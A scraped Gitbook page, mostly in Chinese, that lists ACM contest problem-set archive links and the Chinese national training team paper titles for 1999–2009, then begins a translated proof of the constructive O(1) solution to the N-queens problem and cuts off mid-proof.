http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1995/index.html (Different formats; sample solutions in C; test data and comments) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1996/index.html (Different formats; sample solutions in C; test data and comments) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1997/index.html (Problem set in PostScript, sample solutions in C and judge's test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1998/index.html (Problem set in PostScript, sample solutions in C and judge's test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1999/index.html (PostScript, PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/2001/index.html (PDF) B_US_CentAm http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_CentAm/1997/index.html (Plain Text) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_CentAm/1998/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_CentAm/2000/index.html (Problem Set in PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_CentAm/2001/index.html (Problems in DOC) B_US_EastCen http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1984/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1985/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1986/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1987/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1988/index.html (HTML, sample solution in Pascal (one in FORTRAN!) and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1989/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1990/index.html (HTML, and some solutions in Pascal and C) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1991/index.html (HTML, test data and sample solution in C) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1992/index.html (Problem Set in PDF, scanned ) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1993/index.html (HTML and PostScript) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1994/index.html (Problem Set in HTML and PostScript; Sample solution in C and test data ) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1995/index.html (Problems in PostScript; sample solutions in C, C++ and Pascal; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1996/index.html (Problems in PostScript; sample solutions in C, C++ and Pascal; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1997/index.html (Postscript and PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1998/index.html (Problem set in Postscript, sample solutions in C and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/1999/index.html (PS, PDF and test data+solutions) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/2000/index.html (PS and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_EastCen/2001/index.html (Postscript and test data) B_US_GreatNY http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_GreatNY/1997/index.html (Problem Sets in Word97, zip Archive) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_GreatNY/1998/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_GreatNY/1999/index.html (MS Word; Judge's input) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_GreatNY/2000/index.html (Problems in PDF, test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_GreatNY/2001/index.html (Problems in MS Word, test data input/output) B_US_MidAtl http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidAtl/1996/index.html (Problem statement (ASCII-Text), sample solution in JAVA and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidAtl/1997/index.html (Problem statement (PDF)) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidAtl/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidAtl/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidAtl/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidAtl/2001/index.html (Problem set, test data and sample solutions in Java, C/C++) B_US_MidCen http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/1993/index.html (Problem set in HTML, sample solution and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/1995/index.html (Problem sets in PostScript and HTML, sample solution and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/1996/index.html (Problem set (ZIP-File)) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/1997/index.html (Problem set (ZIP-File)) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/1998/index.html (HTML, sample solution in C++ and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/1999/index.html (PDF, test data and sample solutions in java/C++) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/2000/index.html (Problem Set in PDF, sample solutions in java/C++, test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_MidCen/2001/index.html (Problem set in html; test data, sample solutions in java/C++) B_US_NorthCen http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1993/index.html (Problems in HTML; sample solution in C; test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1994/index.html (Problems in HTML; sample solution in C; test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1995/index.html (Problems in HTML; sample solutions in C) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1996/index.html (Problem set in HTML, sample solutions in C and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1997/index.html (Problem set in HTML, sample solutions in C and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1998/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/2001/index.html (Problem set in PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthCen/misc/index.html (some problems (in HTML) from previous years ) B_US_NorthEast http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthEast/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthEast/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthEast/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_NorthEast/2001/index.html (PDF) B_US_PacNW http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_PacNW/1997/index.html (Problems in Word, sample solutions in various languages and test data (ZIP-file)) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_PacNW/1998/index.html (Problem set in Word, test data (input/output), sample solutions in C) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_PacNW/1999/index.html (ZIP-file) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_PacNW/2000/index.html (Problems in MS Word) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_PacNW/2001/index.html (Problems in PDF and MS Word) B_US_Rocky http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_Rocky/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_Rocky/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_Rocky/2000/index.html (Problems in PDF, test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_Rocky/2001/index.html (Problem set in HTML) B_US_SouthAme http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthAme/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthAme/1999/index.html (PDF, PS) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthAme/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthAme/2001/index.html (PDF) B_US_SouthCal http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCal/1989/index.html (tar-archive with problem statement (TeX-source); sample solutions in Pascal; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCal/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCal/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCal/2001/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCal/misc/index.html (some problems (in HTML) from previous years) B_US_SouthCen http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1987/index.html (Problem set in HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1988/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1990/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1991/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1992/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1993/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1995/index.html (Postscript and plain text; sample solutions in C; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1996/index.html (Problems and solutions (zip-File)) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1997/index.html (One HTML-document per problem containing statement, sample solution in C and judge's test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1998/index.html (Problem set in HTML, solution in C++, test data and comments) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthCen/2001/index.html (Problems in HTML) B_US_SouthEas http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthEas/1988/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthEas/1996/index.html (Postscript) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthEas/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthEas/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthEas/2000/index.html (Problem set in PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_US_SouthEas/2001/index.html (Problems in HTML) B_VV_Asian http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/1995/index.html (Problem Set in HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/1996/index.html (Problem Set in HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/1997/index.html (Problem Set in HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/1998/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/2000/index.html (PDF, some with test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_Asian/2001/index.html (Misc. formats, some with test data) B_VV_SouthPac http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/1991/index.html (tar-archive with problem statement (TeX-source); sample solutions in Pascal; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/1992/index.html (tar-archive with problem statement (TeX-source); sample solutions in Pascal; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/1993/index.html (tar-archive with problem statement (TeX-source); sample solutions in Pascal; and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/1999/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/2000/index.html (Problem Set in PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_VV_SouthPac/2001/index.html (PDF) C_LO_ETH http://www.ntnu.edu.tw/acm/ProblemSetArchive/C_LO_ETH/1994/index.html (Postscript) C_LO_Notre http://www.ntnu.edu.tw/acm/ProblemSetArchive/C_LO_Notre/1994/index.html (Spring and Fall; Postscript) http://www.ntnu.edu.tw/acm/ProblemSetArchive/C_LO_Notre/1995/index.html (Spring and Fall; Postscript) [info] 最后介绍个台湾镜像: http://www.ntnu.edu.tw/acm/ Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/algorithm/acm/ACM国家集训队论文集.html":{"url":"markdown/technical/algorithm/acm/ACM国家集训队论文集.html","title":"ACM 国家集训队论文集","keywords":"","body":"ACM 国家集训队论文集（1999-2009）论文下载论文目录199920002001200220032004200520062007-Day12007-Day22008-Day12008-Day22009ACM 国家集训队论文集（1999-2009） 论文下载 腾讯微云下载（密码：m9xwtc） 论文目录 1999 陈宏：《数据结构的选择与算法效率——从IOI98试题PICTURE谈起》 来煜坤：《把握本质，灵活运用——动态规划的深入探讨》 齐鑫：《搜索方法中的剪枝优化》 邵铮：《数学模型的建立、比较和应用》 石润婷：《隐蔽化、多维化、开放化——论当今信息学竞赛中数学建模的灵活性》 杨帆：《准确性、全面性、美观性——测试数据设计中的三要素》 周咏基：《论随机化算法的原理与设计》 2000 陈彧：《信息学竞赛中的思维方法》 方奇：《动态规划》 高寒蕊：《递推关系的建立及在信息学竞赛中的应用》 郭一：《数学模型及其在信息学竞赛中的应用》 江鹏：《探索构造法解题模式》 李刚：《动态规划的深入讨论》 龙翀：《解决空间规模问题的几种常用的存储结构》 骆骥：《数学模型的建立和选择》 施遥：《人工智能在围棋程序中的应用》 肖洲：《数据结构的在程序设计中的应用》 谢婧：《规模化问题的解题策略》 徐串：《论程序的调试技巧》 徐静：《图论模型的建立与转化》 杨江明：《论数学策略在信息学问题中的应用》 杨培：《非最优化算法初探》 张辰：《动态规划的特点及其应用》 张力：《类比思想在解题中的应用》 张一飞：《冗繁削尽留清瘦——浅谈信息的充分利用》 2001 符文杰：《Pólya原理及其应用》 高寒蕊：《从圆桌问题谈数据结构的综合运用》 高岳：《中等硬度解题报告》 江鹏：《从一道题目的解法试谈网络流的构造与算法》 李益明：《计算几何》 李源：《树的枚举》 刘汝佳：《搬运工问题的启示》 骆骥：《由“汽车问题”浅谈深度搜索的一个方面——搜索对象与策略的重要性》 毛子青：《动态规划算法的优化技巧》 俞玮：《基本动态规划问题的扩展》 张一飞：《求N!的高精度算法》 2002 戴德承：《退一步海阔天空——“目标转化思想”的若干应用》 方奇：《浅谈必要条件的应用》 符文杰：《排序网络》 何江舟：《用高斯消元法解线性方程组》 何林：《猜想及其应用》 黄芸：《POI0110跳舞蝇》 金恺：《浅谈网络流算法的应用》 李澎煦：《半平面交的算法及其应用》 李睿：《二分法与统计问题》 骆骥：《浅析解“对策问题”的两种思路》 孙方成：《偶图的算法及应用》 孙林春：《让我们做得更好——从的解法谈程序优化》 王知昆：《搜索顺序的选择》 许智磊：《二分，再二分！——从Mobiles(IOI2001)一题看多重二分》 杨旻旻：《构造法——解题的最短路径》 张家琳：《多项式乘法》 张宁：《遗传算法的特点及其应用》 张一飞：《由感性认识到理性认识——透析一类搏弈游戏的解答过程》 周文超：《树结构在程序设计中的运用》 2003 何林：《一类称球问题的解法》 王知昆：《浅谈用极大化思想解决最大子矩形问题》 刘才良：《平面图在信息学中的应用》 陆可昱：《长方体体积并》 雷环中：《结果提交类问题》 侯启明：《信息论在信息学竞赛中的简单应用》 刘一鸣：《一类搜索的优化思想——数据有序化》 方奇：《染色法和构造法在棋盘上的应用》 邵烜程：《数学思想助你一臂之力》 饶向荣：《病毒的DNA———剖析一道字符匹配问题解析过程》 林希德：《求最大重复子串》 张云亮：《论对算法的选择》 许智磊：《浅谈补集转化思想在统计问题中的应用》 项荣璟：《充分利用问题性质——例析动态规划的“个性化”优化》 张宁：《猜数问题的研究——《聪明的学生》一题的推广》 伍昱：《由对称性解2-SAT问题》 周源：《浅析“最小表示法”思想在字符串循环同构问题中的应用》 姜尚仆：《模线性方程的应用——用数论方法解决整数问题》 金恺：《探寻深度优先搜索中的优化技巧——从正方形剖分问题谈起》 高正宇：《答案只有一个——浅谈问答式交互问题》 2004 吴景岳：《最小生成树算法及其应用》 朱晨光：《优化，再优化！——从《鹰蛋》一题浅析对动态规划算法的优化》 杨思雨：《伸展树的基本操作与应用》 贝小辉：《浅析树的划分问题》 鬲融：《浅谈特殊穷举思想的应用》 何林：《信息学中守恒法的应用》 胡伟栋：《减少冗余与算法优化》 韩文弢：《论C++语言在信息学竞赛中的应用》 黄源河：《浅谈图论模型的建立与应用》 金恺：《极限法——解决几何最优化问题的捷径》 林涛：《线段树的应用》 李锐喆：《细节——不可忽视的要素》 栗师：《转化目标在解题中的应用》 楼天城：《匹配算法在搜索问题中的巧用》 汪汀：《最小生成树问题的拓展》 肖天：《“分层图思想”及其在信息学竞赛中的应用》 薛矛：《解决动态统计问题的两把利刃》 许智磊：《后缀数组》 周源：《浅谈数形结合思想在信息学竞赛中的应用》 朱泽园：《多串匹配算法及其启示》 2005 蒋炎岩：《数据结构的联合——块状链表》 金恺：《杂题大拼盘》 栗师：《树的乐园——一些与树有关的题目》 吴景岳：《解法讨论》 何林：《数据关系的简化》 胡伟栋：《浅析非完美算法在信息学竞赛中的应用》 黄刚：《数据结构的联合》 黄源河：《左偏树的特点及其应用》 李羽修：《Hash函数的设计优化》 龙凡：《序的应用》 潘震皓：《置换群快速幂运算研究与探讨》 钱自强：《关于遗传算法应用的分析与研究》 任恺：《图论的基本思想及方法》 唐文斌：《正难则反——浅谈逆向思维在解题中的应用》 汪汀：《参数搜索的应用》 王俊：《浅析二分图匹配在信息学竞赛中的应用》 魏冉：《让算法的效率“跳起来”！——浅谈“跳跃表”的相关操作及其应用》 杨俊：《二分策略在信息学竞赛中的应用》 杨思雨：《美，无处不在——浅谈“黄金分割”和信息学的联系》 杨弋：《从的解法谈算法的优化》 张伟达：《用改进算法的思想解决规模维数增大的问题》 周源：《压去冗余缩得精华——浅谈信息学竞赛中的“压缩法”》 朱晨光：《浅析倍增思想在信息学竞赛中的应用》 朱泽园：《回到起点——一种突破性思维》 2006 陈启峰：《“约制、放宽”方法在解题中的应用》 陈首元：《维护森林连通性——动态树》 冯威：《数与图的完美结合——浅析差分约束系统》 高逸涵：《对于一道题目的深入分析》 胡伟栋：《演讲的若干建议》 黄劲松：《贪婪的动态规划》 黄晓愉：《深度优先搜索问题的优化技巧》 贾由：《由图论算法浅析算法优化》 李天翼：《从特殊情况考虑》 龙凡：《一类猜数问题的研究》 汤泽：《浅析队列在一类单调性问题中的应用》 唐文斌：《“调整”思想在信息学中的应用》 汪晔：《信息学中的参考系与坐标系》 王栋：《浅析平面Voronoi图的构造及应用》 王赟：《Trie图的构建、活用与改进》 余远铭：《最短路算法及其应用》 俞鑫：《棋盘中的棋盘——浅谈棋盘的分割思想》 周戈林：《浅谈类比思想》 周以苏：《论反汇编在时间常数优化中的应用》 朱晨光：《基本数据结构在信息学竞赛中的应用》 朱泽园：《半平面交的新算法及其实用价值》 2007-Day1 北京-高逸涵：《与圆有关的离散化》 四川-王晓珂：《解析一类组合游戏》 湖南-仇荣琦：《欧拉回路性质与应用探究》 广东-余江伟：《如何解决动态统计问题》 福建-杨沐：《浅析信息学中的“分”与“合”》 浙江-李宇骞：《浅谈信息学竞赛中的线性规划——简洁高效的单纯形法实现与应用》 湖南-袁昕颢：《动态树及其应用》 陕西-杨哲：《凸完全单调性的加强与应用》 上海-王欣上：《浅谈基于分层思想的网络流算法》 广东-陈启峰：《Size Balanced Tree》 2007-Day2 安徽-杨弋：《Hash在信息学竞赛中的一类应用》 四川-古楠：《平面嵌入》 湖南-郭华阳：《RMQ与LCA问题》 浙江-刘雨辰：《对拟阵的初步研究》 湖南-陈雪：《问题中的变与不变》 四川-何森：《浅谈数据的合理组织》 福建-胡伯涛：《最小割模型在信息学竞赛中的应用》 江苏-陈瑜希：《多角度思考创造性思维——运用树型动态规划解题的思路和方法探析》 安徽-周冬：《生成树的计数及其应用》 广东-刘家骅：《浅谈随机化在信息学竞赛中的应用》 2008-Day1 曹钦翔：《数据结构的提炼与压缩》 郑暾：《平衡规划——浅析一类平衡思想的应用》 刘弈：《浅谈信息学中状态的合理设计与应用》 顾研：《浅谈随机化思想在几何问题中的应用》 周梦宇：《码之道——浅谈信息学竞赛中的编码与译码问题》 肖汉骏：《例谈信息学竞赛分析中的“深”与“广”》 方戈：《浅析信息学竞赛中一类与物理有关的问题》 吕子鉷：《浅谈最短径路问题中的分层思想》 周小博：《浅谈信息学竞赛中的区间问题》 俞华程：《矩阵乘法在信息学中的应用》 2008-Day2 程芃祺：《计算几何中的二分思想》 高逸涵：《部分贪心思想在信息学竞赛中的应用》 陈丹琦：《基于连通性状态压缩的动态规划问题》 张煜承：《一类算法复合的方法》 陈瑜希：《Pólya计数法的应用》 余林韵：《运用化归思想解决信息学中的数列问题》 任一恒：《非完美算法初探》 高亦陶：《从立体几何问题看降低编程复杂度》 苏煜：《对块状链表的一点研究》 周冬：《两极相通——浅析最大—最小定理在信息学竞赛中的应用》 2009 武森：《浅谈信息学竞赛中的“0”和“1”》 贾志豪：《组合游戏略述——浅谈SG游戏的若干拓展及变形》 徐持衡：《浅谈几类背包题》 骆可强：《论程序底层优化的一些方法与技巧》 刘聪：《浅谈数位类统计问题》 李骥扬：《线段跳表——跳表的一个拓展》 汤可因：《浅析竞赛中一类数学期望问题的解决方法》 徐源盛：《对一类动态规划问题的研究》 张昆玮：《数学归纳法与解题之道》 漆子超：《分治算法在树的路径问题中的应用》 罗穗骞：《后缀数组——处理字符串的有力工具》 方展鹏：《浅谈如何解决不平等博弈问题》 姜碧野：《SPFA算法的优化及应用》 毛杰明：《母函数的性质及应用》 董华星：《浅析字母树在信息学竞赛中的应用》 梅诗珂：《信息学竞赛中概率问题求解初探》 高逸涵：《数位计数问题解法研究》 周而进：《浅谈估价函数在信息学竞赛中的应用》 金斌：《欧几里得算法的应用》 曹钦翔：《从“k倍动态减法游戏”出发探究一类组合游戏问题》 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/algorithm/N皇后问题.html":{"url":"markdown/technical/algorithm/N皇后问题.html","title":"N 皇后问题：构造法原理与证明","keywords":"","body":"N 皇后问题 – 构造法原理与证明: 时间复杂度O(1)1. 前言2. 问题背景3. 译者的话4. 译文：m皇后问题的构造解法4.1. 数学模型定义4.2. m皇后通解：三个构造式4.3. 三个构造式的正确性证明4.4. 大前提条件m≥4的证明5. 译者后记：通解转换式（编程用）5.1. 【构造式A】的转换式5.2. 【构造式B】的转换式5.3. 小结：通解转换式归整N 皇后问题 – 构造法原理与证明: 时间复杂度O(1) [原] E.J.Hoffman; J.C.Loessi; R.C.Moore The Johns Hopkins University Applied Physics Laboratory [译] EXP 2017-12-29 [!NOTE|style:flat|label:注意] 由于原文使用了“**m皇后**”进行描述，所以本文从现在开始也使用“**m皇后**”进行描述。 我这里就**不调整**为大多数人习惯的“**n皇后**”了，避免某些数学公式参数混淆。 [success] 【写在前面】 这是现在网上流传的一套关于M皇后问题的构造法公式，但是这套公式是怎么得来的，却鲜有人知。而文本会详细阐述这套公式的推导过程： 1. 前言 文本核心内容主要译自 E.J.Hoffman、 J.C.Loessi 和 R.C.Moore 发表于 Mathematics Magazine 《数学杂志》 上的学术论文 《Constructions for the Solution of the m Queens Problem》 。 该论文已被美国数学协会 Mathematical Association of America 公开，具体期数为 Vol.42, No.2 (Mar., 1969), pp. 66-72。 该文献可从以下途径购买： http://www.jstor.org/stable/2689192 http://links.jstor.org/sici?sici=0025-570X%28196903%2942%3A2%3C66%3ACFTSOT%3E2.0.CO%3B2-9 该文献的英文原文链接： http://penguin.ewu.edu/~trolfe/QueenLasVegas/Hoffman.pdf 英文原文下载 本文译文全文下载 2. 问题背景 M皇后问题： 在M×M格的国际象棋上摆放M个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上。 根据场景，又有三种衍生问题： ① 共有多少种摆法（即有多少种可行解） ② 求出所有可行解 ③ 求任意一个可行解 问题① 属于 禁位排列 问题，目前是存在通项公式直接求解的。 问题② 属于 搜索 问题，在网上也有多种解法，主流是 回溯法（另有衍生的位运算变种算法），但不管如何优化，回溯法都有一个致命的问题：M值不能过大（一般M=30已是极限）。 问题③ 属于 问题② 的子集，因此很多人的切入点依然是回溯法，也有启发式算法的解法：如遗传算法、还有刘汝佳在《算法艺术与信息学竞赛》提出的启发式修补算法。启发式算法在M 但早在1969年， 问题③ 的解就被 E.J.Hoffman、 J.C.Loessi 和 R.C.Moore 找到了潜在的数学规律，通过推导出数学公式，利用 构造法 使得该问题可在 O(1) 的时间复杂度得到解。 3. 译者的话 ① 原文写得有点艰涩，有些中间步骤是跳过了。我就加上自己的理解做了意译，并补上了跳过的步骤和图示，但是核心的推导思路和步骤不会修改。 ② 原文首先给出了3个构造式（其实就是m皇后问题的通解式），然后以此为结论展开了一系列的推导证明这3个构造式是正确的。但是这3个构造式真正是怎么得来，原作者并没有说，估计是原作者做了大量的演绎、从m皇后的特解找到了潜在规则所总结出来的通解。 4. 译文：m皇后问题的构造解法 4.1. 数学模型定义 m皇后问题最初是由Gauss（高斯）提出的，该问题描述如下： 是否有可能在一个m×m的国际棋盘上放置m个皇后使得她们无法互相攻击？（注：皇后是国际象棋中的一种棋子，她可以对横、竖、斜三个方向的棋子发起攻击） 这是一个有趣的问题，我们可以将其约束到一个 数学模型 进行描述： 把棋盘定义为一个m×m的方格矩阵，那么对于任意方格可以使用有序对 (i, j) 以表示其行列坐标，其中 1 ≤ i ≤ m 表示该方格的行编号， 1 ≤ j ≤ m 表示该方格的列编号。 同时我们再为每个方格定义一组对角编号： 令自左上到右下方向为主对角线，对于主对角线上的方格 (i, j) ，显然有： 　　m - j + i = MAJOR_CONSTANT —— 译者注：这个公式对后续推导起到重要作用 其中 MAJOR_CONSTANT 称之为主对角常数，显然有 1 ≤ MAJOR_CONSTANT ≤ m ，将其定义为方格 (i, j) 的主对角编号。 进一步地，令自右上到左下方向为次对角线，对于次对角线上的方格 (i, j) ，显然有： 　　i + j - 1 = MINOR_CONSTANT —— 译者注：这个公式对后续推导起到重要作用 其中 MINOR_CONSTANT 称之为次对角常数，显然有 1 ≤ MINOR_CONSTANT ≤ m ，将其定义为方格 (i, j) 的次对角编号。 至此，m皇后问题的解模型可以定义为如下： 放置m个皇后到一个m×m的方格矩阵，使得皇后们的所在的方格同时满足下面所有条件： ① 行编号唯一 ② 列编号唯一 ③ 主对角编号唯一 ④ 次对角编号唯一 这个模型足以解决所有m皇后问题（但仅适用于 m ≥ 4 的情况，因为 m = 2、3 时无解，m = 1 的解就不需要讨论了） —— 译者注：这个大前提条件会在最后进行论证 4.2. m皇后通解：三个构造式 由于通解公式相对复杂，为了便于说明，此处不从过程推导出结论，而是反其道而行之：先给出结论的通解公式（且不考虑公式是怎么推演出来的），再证明之。 [info] 　m皇后问题的解的共由3个构造式组成。 4.2.1. 【构造式A】 令 m = 2n，其中 n = 2, 3, 4, ... 构造式A仅适用于m是偶数的情况，它由两个子公式组成： 4.2.2. 【构造式B】 令 m = 2n，其中 n = 2, 3, 4, ... 构造式B同样仅适用于m是偶数的情况，它同样由两个子公式组成： 4.2.3. 【构造式C】 构造式C是构造式A或B的扩展推导式，仅适用于m+1是奇数的情况： 当已使用构造式A或B求得一个m×m的皇后问题的解时，若同时增加第 m+1 行和第 m+1 列，那么第 m+1 个皇后应放置在坐标为 (m+1, m+1) 的方格。 4.3. 三个构造式的正确性证明 要证明构造式是成立的，只需要证明每个构造式导出的皇后位置均满足： ① 行编号唯一 ② 列编号唯一 ③ 主对角编号唯一 ④ 次对角编号唯一 4.3.1. 【构造式A】的证明 4.3.1.1. 【构造式A】 令 m = 2n，其中 n = 2, 3, 4, ...（即m≥4且是偶数）： 构造式含义：若把棋盘在横中轴线切开，很明显解集是呈中心旋转对称的，其中上半部分对应PA-1的解集，下半部分对应PA-2的解集： 4.3.1.2. 【定理A】 [!TIP|style:flat|label:定理A] 对于m皇后问题，当 n != 3λ + 1 （其中 λ = 0, 1, 2, ... ）时，则必定可以使用【构造式A】求解。 4.3.1.3. 【定理A】的证明 ① 行列编号的唯一性证明： 根据 PA-1 导出的皇后位置为 (k, 2k) ，其中 1 ≤ k ≤ n 根据 PA-2 导出的皇后位置为 (2n+1-l, 2n+1-2l) ，其中 1 ≤ l ≤ n 明显地，PA-1 的每个皇后放置在前n行的每个奇数列，PA-2 的每个皇后放置在后n行的每个偶数列，亦即每行每列均有且只有一个皇后，行列编号的唯一性得证。 ② 主对角编号的唯一性证明： 　受 k、l 